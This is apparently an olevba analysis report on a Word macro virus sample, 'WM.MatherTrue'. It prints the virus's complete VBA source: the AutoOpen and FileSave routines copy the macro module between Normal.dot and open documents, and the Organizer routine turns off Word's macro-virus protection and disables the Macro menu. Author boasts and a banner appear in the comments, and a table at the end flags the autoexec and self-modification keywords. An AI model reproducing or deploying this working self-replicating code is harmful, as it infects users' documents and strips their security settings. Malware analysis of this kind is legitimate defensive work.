olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mtrue.b-a34d0a5ae3c7374ef3c2988c2f51337448bdf612
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mtrue.b-a34d0a5ae3c7374ef3c2988c2f51337448bdf612 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MatherTrue.bas 
in file: Virus.MSWord.Mtrue.b-a34d0a5ae3c7374ef3c2988c2f51337448bdf612 - OLE stream: 'Macros/VBA/MatherTrue'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

  Dim ResultFDoc As Boolean 'True ĺńëč â ŕęňčâíîě äîęóěĺíňĺ ĺńňü ěîäóëü ń čěĺíĺě Ěname
  Dim ResultFTemplite As Boolean 'True ĺńëč â Normal.Dot ĺńňü ěîäóëü ń čěĺíĺě Ěname
  Dim Path_Normal As String 'ďóňü ę Normal.Dot
  Dim Path_Doc As String 'ďóňü ę ŕęňčâíîěó äîęóěĺíňó
  Dim I As Integer 'ďĺđĺěĺííŕ˙ äë˙ öčęëŕ
  Dim HowMach As Integer 'ęîëč÷ĺńňâî ěîäóëĺé â ďđîĺęňĺ
  Dim Doc As Boolean
  Dim N As Integer

  Public Const Mname As String = "MatherTrue" 'čě˙ ěîäóë˙, îňęóäŕ áđŕňü ęîä
  
'Âűçűâŕĺňüń˙ ďđč íŕćŕňčč íŕ ęíîďęó Organizer
Public Sub Organizer()
Attribute Organizer.VB_Description = "Ěŕęđîń çŕďčńŕí 31.03.99 33715351"
Attribute Organizer.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.DS"
           CommandBars("Visual Basic").Enabled = True
           With CommandBars("Macro")
             For I = 1 To .Controls.Count
                 .Controls(I).Enabled = False
             Next I
           End With
           ShowVisualBasicEditor = False
           Application.DisplayStatusBar = True
           With Options
                .VirusProtection = False
                .AllowFastSave = True
                .SaveInterval = 3
           End With
End Sub

'Âűçűâŕĺňüń˙ ďđč íŕćŕňčč íŕ ęíîďęó Macro
Public Sub ToolsMacro()
End Sub

'Âűçűâŕĺňüń˙ ďđč ńîçäŕíčč íîâîăî äîęóěĺíňŕ (ďđč çŕďóńęĺ Word'ŕ íîâűé äîęóěĺíň ńîçäŕ¸ňüń˙ ŕâňîěŕňč÷ĺńęč)
Public Sub AutoNew()
           Call Organizer
End Sub

'Âűçűâŕĺňüń˙ ďđč ŕęňčâčçŕöčč đĺćčěŕ ńîőđŕíĺíč˙ ŕęňčâíîăî äîęóěĺíňŕ čëč řŕáëîíŕ (íŕćŕňčč íŕ ęíîďęó "Ńîőđŕíčňü")
Public Sub FileSave()
              Doc = False
              N = Len(ActiveDocument.Name)
           If N < 10 Then N = 1
           If N >= 10 And N <= 99 Then N = 2
           If N >= 99 And N <= 1000 Then N = 3
           If Mid(ActiveDocument.Name, 1, Len(ActiveDocument.Name) - N) = "Äîęóěĺíň" Then Doc = True
           ShowVisualBasicEditor = True
           ResultFDoc = False
           If PrintPreview = False Then
              HowMach = Application.ActiveDocument.VBProject.VBComponents.Count
              For I = 1 To HowMach
                If Mname = Application.ActiveDocument.VBProject.VBComponents(I).Name Then ResultFDoc = True
              Next I
              If ResultFDoc <> True Then
                 Path_Normal = Application.NormalTemplate.FullName
                 Path_Doc = Application.ActiveDocument.FullName
                 Application.OrganizerCopy Source:=Path_Normal, Destination:=Path_Doc, Name:=Mname, Object:=wdOrganizerObjectProjectItems
                 Call Organizer
              End If
            If Doc = True Then Dialogs(wdDialogFileSaveAs).Show: Exit Sub
            ActiveDocument.Save
            End If
End Sub

'Âűçűâŕĺňüń˙ ďđč ŕęňčâčçŕöčč đĺćčěŕ ńîőđŕíĺíč˙ âńĺő ŕęňčâíűő äîęóěĺíňîâ č/čëč řŕáëîíîâ (íŕćŕňčč íŕ ęíîďęó "Ńîőđŕíčňü âńĺ")
Public Sub FileSaveAll()
           ShowVisualBasicEditor = False
           Call FileSave
End Sub

'Âűçűâŕĺňüń˙ ďđč ŕęňčâčçŕöčč đĺćčěŕ ďĺ÷ŕňč ń ňĺęóůčěč óńňŕíîâęŕěč
Public Sub FilePrintDefault()
           ShowVisualBasicEditor = False
         '  ActiveDocument.Content.InsertAfter Text:="Âîň ňŕęŕ˙ îíŕ ďđŕâäŕ-ěŕěęŕ, ŕ ďđîňčâ ďđŕâäű íĺ ďîďđ¸řü...Ďđčâĺň  Ěčőŕéëîâîé Ţëüęĺ. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ..."
           ActiveDocument.PrintOut
End Sub

'Âűçűâŕĺňüń˙ ďđč ŕęňčâčçŕöčč äčŕëîăîîăî îęíŕ ďĺ÷ŕňč
Public Sub FilePrint()
           ShowVisualBasicEditor = False
        '   ActiveDocument.Content.InsertAfter Text:="Âîň ňŕęŕ˙ îíŕ ďđŕâäŕ-ěŕěęŕ, ŕ ďđîňčâ ďđŕâäű íĺ ďîďđ¸řü...Ďđčâĺň  Ěčőŕéëîâîé Ţëüęĺ. Coded by DI°            WM.MatherTrue -  I see, i'm here, i'm conqure ... "
           Dialogs(wdDialogFilePrint).Show
End Sub

'Âűçűâŕĺňüń˙ ďđč îňęđűňčč äîęóěĺíňŕ/řŕáëîíŕ
'číńňŕë˙öč˙ ęîäŕ â Normal.Dot
Public Sub AutoOpen()
           ResultFTemplite = False
           If PrintPreview = False Then
              HowMach = Application.NormalTemplate.VBProject.VBComponents.Count
              For I = 1 To HowMach
                If Mname = Application.NormalTemplate.VBProject.VBComponents(I).Name Then ResultFTemplite = True
              Next I
              If ResultFTemplite <> True Then
                 Path_Normal = Application.NormalTemplate.FullName
                 Path_Doc = Application.ActiveDocument.FullName
                 Application.OrganizerCopy Source:=Path_Doc, Destination:=Path_Normal, Name:=Mname, Object:=wdOrganizerObjectProjectItems
              End If
           End If
End Sub
' Destroyer Inc° Or PIPA's E&CS™ Company presented the
' MacroVirus WM.MatherTrue
' (C) CopyRight 16.04.1999 Ukrein Hmelnitsky
' WM.MatherTrue Was Make In Ms Offise (MS Word - 8.0)
' Hackers And VirusMakers All Country - UNITED !!!
' "Virus For PC, PC For Virus"
' Big Hy For VRV Virus Production™, Predator'S°,SNAKE,S@S,DM,AlexHelraiser  by Destroyer Inc °
' ÄĹĚÁĹËÜ íĺ čçáĺćĺí !!!' ŔĐČß áĺńńěĺđňíŕ !!! ŔĐČß The Best !!!
'
' #####      ######    #####    #######   ######     ####    #     #   ######   ######
' #    ##    #    #   #     #      #      #     #   #    #   #     #   #    #   #     #
' #     ##   # #      #            #      #     #   #    #   #     #   # #      #     #
' #      #   ###       #####       #      ######    #    #    #### #   ###      ######
' #     ##   # #            #      #      #  #      #    #         #   # #      #  #
' #    ##    #    #   #     #      #      #   #     #    #         #   #    #   #   #
' #####      ######    #####       #      #    #     ####     ####     ######   #    #
'
'
'         #######   #     #   #######   ##
'            #      ##    #   #     #   ##
'            #      # #   #   #
'            #      #  #  #   #
'            #      #   # #   #
'            #      #    ##   #
'         #######   #     #   #######
'
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|3qSQ                |33715351                                     |
+----------+--------------------+---------------------------------------------+

